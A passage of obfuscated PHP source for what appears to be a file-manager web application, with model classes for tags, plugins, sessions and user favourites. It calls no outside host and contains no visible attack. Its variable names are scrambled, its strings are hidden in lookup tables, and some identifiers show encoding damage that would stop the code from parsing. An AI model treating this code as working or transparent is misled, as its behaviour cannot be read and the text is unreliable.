$ÜŞ‚ƒø = $this->get($ŒÎ’÷¼Î); if (!$ÜŞ‚ƒø || !isset($ÜŞ‚ƒø[$ËÈ¯æ¬·[364]])) { return !1; } $ë‘ØÃäÃ = array_find_by_field($ÜŞ‚ƒø[$ËÈ¯æ¬·[364]], $ËÈ¯æ¬·[392], $ü¥­¶·‰); return is_array($ë‘ØÃäÃ) ? $ë‘ØÃäÃ : !1; } public function listSource($Øş‹¿Öô, $Øäñ·‡‚) { $ğû…”¥Ì =& $_SERVER[ì…™Î¶Ï]; if ($Øäñ·‡‚ && !is_array($Øäñ·‡‚)) { $Øäñ·‡‚ = array($Øäñ·‡‚); } $©¨ºÙƒÇ = $this->listData($Øş‹¿Öô); $¾¾İ ‰à = array(); foreach ($©¨ºÙƒÇ as $ÄŠºóì¿) { $¦µ×¹‹« = $ÄŠºóì¿[$ğû…”¥Ì[78]]; if (!$¦µ×¹‹«) { continue; } if (!isset($¾¾İ ‰à[$¦µ×¹‹«])) { $¾¾İ ‰à[$¦µ×¹‹«] = array(); } $¾¾İ ‰à[$¦µ×¹‹«][] = $ÄŠºóì¿[$ğû…”¥Ì[418]]; } $ûìèü¨í = array(); foreach ($¾¾İ ‰à as $Ñ§Á¬â => $Ë–Ì™âğ) { $›ìÕ† = !0; if (!$Øäñ·‡‚) { $ûìèü¨í[] = $Ñ§Á¬â; continue; } foreach ($Øäñ·‡‚ as $˜¯ğÈ´Ÿ) { if (!in_array($˜¯ğÈ´Ÿ, $Ë–Ì™âğ)) { $›ìÕ† = !1; break; } } if ($›ìÕ†) { $ûìèü¨í[] = $Ñ§Á¬â; } } if (!$ûìèü¨í) { return array(); } $«®ËºÑ = array($ğû…”¥Ì[409] => array($ğû…”¥Ì[410], $ûìèü¨í), $ğû…”¥Ì[495] => $Øş‹¿Öô, $ğû…”¥Ì[403] => SourceModel::TYPE_GROUP); $µÒøú×ö = Model($ğû…”¥Ì[1301])->listSource($«®ËºÑ); if (!$µÒøú×ö || count($ûìèü¨í) == $µÒøú×ö[$ğû…”¥Ì[361]][$ğû…”¥Ì[362]]) { return $µÒøú×ö; } $³“©ĞĞˆ = array(); $İÛæÈ¥® = array_to_keyvalue($µÒøú×ö[$ğû…”¥Ì[77]], $ğû…”¥Ì[12], $ğû…”¥Ì[394]); $ÅÀÖ…šÏ = array_to_keyvalue($µÒøú×ö[$ğû…”¥Ì[76]], $ğû…”¥Ì[12], $ğû…”¥Ì[394]); $ı«åËÚ£ = array_merge($ÅÀÖ…šÏ, $İÛæÈ¥®); foreach ($ûìèü¨í as $¦µ×¹‹«) { if (!in_array($¦µ×¹‹«, $ı«åËÚ£)) { $³“©ĞĞˆ[] = $¦µ×¹‹«; } } if ($³“©ĞĞˆ) { $this->removeBySource($Øş‹¿Öô, $³“©ĞĞˆ); } return $µÒøú×ö; } protected function listData($­¦Ëşàô) { $½ä½Ü¸ =& $_SERVER[ì…™Î¶Ï]; $·…›Ê¬š = array($½ä½Ü¸[1622] => 0, $½ä½Ü¸[474] => array($½ä½Ü¸[1911], 0), $½ä½Ü¸[414] => $½ä½Ü¸[1912] . $­¦Ëşàô); $°»˜È¤ = $½ä½Ü¸[1913]; $õ ÜıÑ° = $this->field($°»˜È¤)->where($·…›Ê¬š)->order($½ä½Ü¸[1914])->select(); return $õ ÜıÑ° ? $õ ÜıÑ° : array(); } protected function addToTag($æ´‘– ù, $åµğ¾¬Û, $·“¨«‡) { $Ä¼ÃùãÈ =& $_SERVER[ì…™Î¶Ï]; if (!$this->getByTagID($æ´‘– ù, $·“¨«‡) || !$åµğ¾¬Û) { return !1; } if (!Model($Ä¼ÃùãÈ[800])->pathInfo($åµğ¾¬Û)) { return !1; } $›‡ÅË = array($Ä¼ÃùãÈ[1622] => 0, $Ä¼ÃùãÈ[474] => $·“¨«‡, $Ä¼ÃùãÈ[413] => $åµğ¾¬Û, $Ä¼ÃùãÈ[414] => $Ä¼ÃùãÈ[1915] . $æ´‘– ù, $Ä¼ÃùãÈ[412] => $Ä¼ÃùãÈ[12], $Ä¼ÃùãÈ[1803] => 0); if ($this->where($›‡ÅË)->find()) { return !1; } return $this->add($›‡ÅË); } protected function removeFromTag($ò§»††–, $Ÿ‘ÎÛºÅ, $ŞÇÍü”Û) { $´¿¨»ËÒ =& $_SERVER[ì…™Î¶Ï]; if (!$this->getByTagID($ò§»††–, $ŞÇÍü”Û) || !$Ÿ‘ÎÛºÅ) { return !1; } if (is_array($Ÿ‘ÎÛºÅ)) { $Ÿ‘ÎÛºÅ = array($´¿¨»ËÒ[7], $Ÿ‘ÎÛºÅ); } $Æèú˜¸— = array($´¿¨»ËÒ[1622] => 0, $´¿¨»ËÒ[474] => $ŞÇÍü”Û, $´¿¨»ËÒ[414] => $´¿¨»ËÒ[1915] . $ò§»††–, $´¿¨»ËÒ[413] => $Ÿ‘ÎÛºÅ); return $this->where($Æèú˜¸—)->delete(); } protected function removeByTag($•òĞ”±İ, $Ø«´ïƒ…) { $‡–«”ñ =& $_SERVER[ì…™Î¶Ï]; if (!$this->getByTagID($•òĞ”±İ, $Ø«´ïƒ…)) { return !1; } $ì¿È¤„Ó = array($‡–«”ñ[1622] => 0, $‡–«”ñ[474] => $Ø«´ïƒ…, $‡–«”ñ[414] => $‡–«”ñ[1915] . $•òĞ”±İ); return $this->where($ì¿È¤„Ó)->delete(); } protected function removeBySource($¥•¢ä¨ø, $İóÒÏ”Õ) { $ŒÌƒ‡°€ =& $_SERVER[ì…™Î¶Ï]; if (!$¥•¢ä¨ø || !$İóÒÏ”Õ) { return !1; } if (is_array($İóÒÏ”Õ)) { $İóÒÏ”Õ = array($ŒÌƒ‡°€[7], $İóÒÏ”Õ); } $²Š¸ƒ…Ó = array($ŒÌƒ‡°€[1622] => 0, $ŒÌƒ‡°€[413] => $İóÒÏ”Õ, $ŒÌƒ‡°€[474] => array($ŒÌƒ‡°€[990], 0), $ŒÌƒ‡°€[414] => $ŒÌƒ‡°€[1915] . $¥•¢ä¨ø); return $this->where($²Š¸ƒ…Ó)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\145\x6d\56\x70\154\165\x67\x69\x6e\x4c\x69\163\x74"; public $field = array("\156\141\x6d\145", "\x73\x74\x61\x74\x75\x73", "\162\145\x67\x69\x65\163\164", "\143\x6f\x6e\146\151\147"); public function loadList($ã£¢Ãšî = false) { $‹´”‡Û¨ = array_to_keyvalue($this->listData(), $_SERVER[ì…™Î¶Ï][32]); if ($ã£¢Ãšî) { return $‹´”‡Û¨[$ã£¢Ãšî]; } return $‹´”‡Û¨; } public function init() { $øáÈˆ•‰ =& $_SERVER[ì…™Î¶Ï]; Hook::trigger($øáÈˆ•‰[1916]); $µ‚ÚÇ•ı = $this->loadPluginList(); foreach ($µ‚ÚÇ•ı as $•®·³Ì => $²†ù‘µÁ) { $–µ±¨›ã = $this->appAllow($•®·³Ì, $²†ù‘µÁ); if (!$–µ±¨›ã) { continue; } foreach ($²†ù‘µÁ[$øáÈˆ•‰[1917]] as $ƒÙ—»º³ => $‡¸­õ) { Hook::bind($ƒÙ—»º³, $‡¸­õ); } } Hook::trigger($øáÈˆ•‰[1918]); Hook::trigger(ACTION); } public function appAllow($Ó¶šüÂ®, $°ÈÔî²ª, $ßÛªî¾© = true) { $¥×ûıÄÕ =& $_SERVER[ì…™Î¶Ï]; $¥äœ”û = PLUGIN_DIR . $Ó¶šüÂ® . $¥×ûıÄÕ[1919]; if (!is_array($°ÈÔî²ª) || !is_array($°ÈÔî²ª[$¥×ûıÄÕ[1917]]) || $°ÈÔî²ª[$¥×ûıÄÕ[725]] != 1 || !is_file($¥äœ”û)) { return !1; } if ($GLOBALS[$¥×ûıÄÕ[496]] == 1) { return !0; } if ($ßÛªî¾© && !Action($¥×ûıÄÕ[1920])->checkAuth($Ó¶šüÂ®)) { return !1; } return !0; } public function unInstall($òÜ™Öåƒ) { $¡ÊĞÌ„ó =& $_SERVER[ì…™Î¶Ï]; $òšÜ¯À¬ = $this->loadList($òÜ™Öåƒ); if (file_exists(PLUGIN_DIR . $òÜ™Öåƒ)) { Hook::apply($òÜ™Öåƒ . $¡ÊĞÌ„ó[1921]); } $this->remove($òšÜ¯À¬[$¡ÊĞÌ„ó[392]]); } public function changeStatus($¹’ı“Ú‡, $„Çßğñ) { $«”’òÉ¿ =& $_SERVER[ì…™Î¶Ï]; $·ìÚ—ÚÌ = $this->loadList($¹’ı“Ú‡); if ($„Çßğñ) { Hook::apply($¹’ı“Ú‡ . $«”’òÉ¿[1922]); } $this->update($·ìÚ—ÚÌ[$«”’òÉ¿[392]], array($«”’òÉ¿[1923] => $„Çßğñ)); } public function appRegist($ü×îÒ§†, $‘Ã«³º) { $„Ú€Âë© =& $_SERVER[ì…™Î¶Ï]; $„ÙŞªşŸ = $this->loadList($ü×îÒ§†); if ($„ÙŞªşŸ) { $this->update($„ÙŞªşŸ[$„Ú€Âë©[392]], array($„Ú€Âë©[1917] => $‘Ã«³º)); } else { $Àäœ´¶¥ = array($„Ú€Âë©[32] => $ü×îÒ§†, $„Ú€Âë©[1917] => $‘Ã«³º, $„Ú€Âë©[725] => 0, $„Ú€Âë©[6] => $this->getConfigDefault($ü×îÒ§†)); $this->insert($Àäœ´¶¥); } } public function getConfigDefault($äçš‡Ù) { $¢÷õõœÆ =& $_SERVER[ì…™Î¶Ï]; $¸«°…‘Ä = array(); $ä…Î»æ = $this->getPackageJson($äçš‡Ù); if (!$ä…Î»æ && is_array($ä…Î»æ[$¢÷õõœÆ[1924]])) { return $¸«°…‘Ä; } foreach ($ä…Î»æ[$¢÷õõœÆ[1924]] as $ŠŒ …ø› => $ãŒ÷¼÷¢) { if (!isset($ãŒ÷¼÷¢[$¢÷õõœÆ[369]]) || isset($¸«°…‘Ä[$ŠŒ …ø›])) { continue; } $¸«°…‘Ä[$ŠŒ …ø›] = $ãŒ÷¼÷¢[$¢÷õõœÆ[369]]; } return $¸«°…‘Ä; } public function getPackageJson($ØÙ´ë¹é) { return Hook::apply($ØÙ´ë¹é . $_SERVER[ì…™Î¶Ï][1925]); } public function getConfig($ÉáãÚ¨ß, $”Üîˆï = false) { $ñŸõàÈ÷ =& $_SERVER[ì…™Î¶Ï]; $‡Ú’»á† = array(); $áØˆß®› = $this->loadList($ÉáãÚ¨ß); if ($áØˆß®› && is_array($áØˆß®›[$ñŸõàÈ÷[6]])) { $‡Ú’»á† = $áØˆß®›[$ñŸõàÈ÷[6]]; } if (!$‡Ú’»á† || $”Üîˆï) { $‡Ú’»á† = $this->getConfigDefault($ÉáãÚ¨ß); } return $‡Ú’»á†; } public function setConfig($Üğ“ª¯—, $®åœ´…Ğ = false) { $ï¼Ï‰ù¸ =& $_SERVER[ì…™Î¶Ï]; $æ–¹ÇµÉ = $this->loadList($Üğ“ª¯—); if (!$æ–¹ÇµÉ) { return !1; } $Î–„½»Í = $æ–¹ÇµÉ[$ï¼Ï‰ù¸[6]]; if ($®åœ´…Ğ == !1) { $Î–„½»Í = array(); $®åœ´…Ğ = $this->getConfigDefault($Üğ“ª¯—); } foreach ($®åœ´…Ğ as $ÑÍ¥íŸü => $ÂØÎ¸¨) { $Î–„½»Í[$ÑÍ¥íŸü] = is_string($ÂØÎ¸¨) ? trim($ÂØÎ¸¨) : $ÂØÎ¸¨; } $this->update($æ–¹ÇµÉ[$ï¼Ï‰ù¸[392]], array($ï¼Ï‰ù¸[6] => $Î–„½»Í)); } public function viewList() { $õ‹Ï÷û” =& $_SERVER[ì…™Î¶Ï]; $æ¥¿Õ³¸ = $this->loadList(); $this->pluginScan($æ¥¿Õ³¸); $æ¥¿Õ³¸ = $this->loadPluginList(); $òãÛ¿ = array(); foreach ($æ¥¿Õ³¸ as $Â¯­Ğ¦ => $ãö’Ä–¾) { unset($ãö’Ä–¾[$õ‹Ï÷û”[1917]], $ãö’Ä–¾[$õ‹Ï÷û”[6]]); $¢´¦À’¾ = PLUGIN_DIR . $ãö’Ä–¾[$õ‹Ï÷û”[32]] . $õ‹Ï÷û”[1919]; if (!is_file($¢´¦À’¾)) { continue; } $ÎèÄ–”³ = Hook::apply($ãö’Ä–¾[$õ‹Ï÷û”[32]] . $õ‹Ï÷û”[1925]); if (is_array($ÎèÄ–”³)) { $òãÛ¿[$Â¯­Ğ¦] = array_merge($ãö’Ä–¾, $ÎèÄ–”³); } } return $òãÛ¿; } private function loadPluginList() { $Üšñ™› =& $_SERVER[ì…™Î¶Ï]; $ßÏ©´®¡ = $this->loadList(); if (strtolower(MOD) == $Üšñ™›[1926]) { return $ßÏ©´®¡; } $•¸ó„¾õ = Hook::trigger($Üšñ™›[1927], $ßÏ©´®¡); if ($ßÏ©´®¡ && !$•¸ó„¾õ) { die; } return $•¸ó„¾õ ? $•¸ó„¾õ : $ßÏ©´®¡; } private function pluginScan($¶½ó¬¿ ) { $¥ÚùïŒ• =& $_SERVER[ì…™Î¶Ï]; recursion_dir(PLUGIN_DIR, $¦úìÕ±Ÿ, $¤ÛÌËÙÅ, 0); foreach ($¦úìÕ±Ÿ as $Ò¬ş©¥ö) { $Ò¡ÒôÊÙ = get_path_this($Ò¬ş©¥ö); if (isset($¶½ó¬¿ [$Ò¡ÒôÊÙ]) || !file_exists($Ò¬ş©¥ö . $¥ÚùïŒ•[1928]) || !file_exists($Ò¬ş©¥ö . $¥ÚùïŒ•[1919])) { continue; } Hook::apply($Ò¡ÒôÊÙ . $¥ÚùïŒ•[1922]); } } } class SessionModel extends ModelBase { protected $tableName = "\163\171\163\x74\x65\155\x5f\x73\145\x73\x73\x69\157\156"; public function get($½á¾É‹Ş) { $Æ‹‹æ¶ =& $_SERVER[ì…™Î¶Ï]; $†ñô×¹Ï = $this->where(array($Æ‹‹æ¶[1929] => $½á¾É‹Ş))->find(); if (!is_array($†ñô×¹Ï)) { return !1; } return $†ñô×¹Ï[$Æ‹‹æ¶[730]]; } public function set($¹¿¹ÂÁÚ, $‘èÄë˜, $œ‹š¤¯ = 3600) { $–ô¹¹¿– =& $_SERVER[ì…™Î¶Ï]; $¼æû×ãâ = array($–ô¹¹¿–[1929] => $¹¿¹ÂÁÚ, $–ô¹¹¿–[1837] => $‘èÄë˜, $–ô¹¹¿–[1930] => $œ‹š¤¯ + time()); if (Session::get($–ô¹¹¿–[1931])) { $¼æû×ãâ[$–ô¹¹¿–[1631]] = Session::get($–ô¹¹¿–[1931]); } else { $¼æû×ãâ[$–ô¹¹¿–[1631]] = 0; } if ($this->get($¹¿¹ÂÁÚ)) { return $this->where(array($–ô¹¹¿–[1929] => $¹¿¹ÂÁÚ))->save($¼æû×ãâ); } else { return $this->add($¼æû×ãâ, array(), !0); } } public function remove($¢Ø•¡¯ô) { return $this->where(array($_SERVER[ì…™Î¶Ï][1929] => $¢Ø•¡¯ô))->delete(); } public function clearTimeout() { return $this->where($_SERVER[ì…™Î¶Ï][1932] . time())->delete(); } } goto eÚæ®Ü—Ê; eÓà¯ Âê: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\163\x65\x72\x5f\146\x61\166"; protected function cacheFunctionAlias($©Ÿ¯¤çº) { $—ÀÊúóµ =& $_SERVER[ì…™Î¶Ï]; return array($—ÀÊúóµ[1907] => array(USER_ID, $—ÀÊúóµ[1908])); } protected function listData() { $ÁÅÔ®Éª =& $_SERVER[ì…™Î¶Ï]; $”¸ªñ¶¿ = array($ÁÅÔ®Éª[1622] => USER_ID, $ÁÅÔ®Éª[474] => array($ÁÅÔ®Éª[1911], 0)); $µüœ¢‡ = $ÁÅÔ®Éª[1913]; $ ‡„‘ù = $this->field($µüœ¢‡)->where($”¸ªñ¶¿)->order($ÁÅÔ®Éª[1914])->select(); return $ ‡„‘ù ? $ ‡„‘ù : array(); } protected function listByTag($«ßòåÍ²) { } protected function addToTag($…Ë·Õ·ø, $Â°¼½Ÿ’) { $¢®µÄÅ„ =& $_SERVER[ì…™Î¶Ï]; if (!Model($¢®µÄÅ„[2048])->listData($Â°¼½Ÿ’) || !Model($¢®µÄÅ„[800])->pathInfo($…Ë·Õ·ø)) { return !1; } $şÓ®‰£Á = array($¢®µÄÅ„[1622] => USER_ID, $¢®µÄÅ„[474] => $Â°¼½Ÿ’, $¢®µÄÅ„[413] => $…Ë·Õ·ø, $¢®µÄÅ„[414] => $¢®µÄÅ„[408], $¢®µÄÅ„[412] => $¢®µÄÅ„[12], $¢®µÄÅ„[1803] => 0); if ($this->where($şÓ®‰£Á)->find()) { return !1; } return $this->add($şÓ®‰£Á); } protected function removeFromTag($¨ƒÜ¾±Ğ, $ÅÓ¥Üñ) { $Å±Î‘å° =& $_SERVER[ì…™Î¶Ï]; if (!Model($Å±Î‘å°[2048])->listData($ÅÓ¥Üñ)) { return !1; } if (is_array($¨ƒÜ¾±Ğ)) { $¨ƒÜ¾±Ğ = array($Å±Î‘å°[7], $¨ƒÜ¾±Ğ); } $à×Ò€ğø = array($Å±Î‘å°[1622] => USER_ID, $Å±Î‘å°[474] => $ÅÓ¥Üñ, $Å±Î‘å°[414] => $Å±Î‘å°[408], $Å±Î‘å°[413] => $¨ƒÜ¾±Ğ); return $this->where($à×Ò€ğø)->delete(); } protected function removeByTag($Âöîí±Ç) { $‚†”ÓËı =& $_SERVER[ì…™Î¶Ï]; if (!$Âöîí±Ç) { return !1; } $ÑÅÍŠÄ = array($‚†”ÓËı[1622] => USER_ID, $‚†”ÓËı[474] => $Âöîí±Ç); return $this->where($ÑÅÍŠÄ)->delete(); } protected function removeBySource($½­‹ÖÈ˜) { $ş¡ÂÑ‘œ =& $_SERVER[ì…™Î¶Ï]; if (is_array($½­‹ÖÈ˜)) { $½­‹ÖÈ˜ = array($ş¡ÂÑ‘œ[7], $½­‹ÖÈ˜); } $½Éé¸İ’ = array($ş¡ÂÑ‘œ[1622] => USER_ID, $ş¡ÂÑ‘œ[413] => $½­‹ÖÈ˜, $ş¡ÂÑ‘œ[474] => array($ş¡ÂÑ‘œ[990], 0)); return $this->where($½Éé¸İ’)->delete(); } }